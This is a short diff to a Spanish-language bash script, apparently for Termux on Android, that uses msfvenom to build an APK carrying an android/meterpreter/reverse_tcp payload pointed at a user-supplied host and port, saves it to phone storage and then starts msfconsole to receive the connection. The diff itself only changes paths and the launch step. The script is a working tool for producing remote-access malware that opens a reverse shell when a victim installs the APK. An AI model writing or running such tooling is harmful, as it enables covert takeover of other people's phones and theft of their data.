@@ -25,8 +25,8 @@ echo ""
 echo ""
 echo -e "\e[0;35mCreando "$name".apk , Espere...\e[0m"
 
-cd $HOME/metasploit-framework
-./msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port R > /storage/emulated/0/$name.apk
+cd $HOME
+msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port R > /storage/emulated/0/$name.apk
 clear
 sleep 1
 echo -e "\e[1;32mEl payload "$name".apk , Ha sido generado con exito\e[0m"
@@ -36,8 +36,6 @@ echo ""
 echo ""
 toilet -f pagga msfconsole
 sleep 3
-cd $HOME
-cd auto
-bash db.sh
+msfconsole
 exit
 
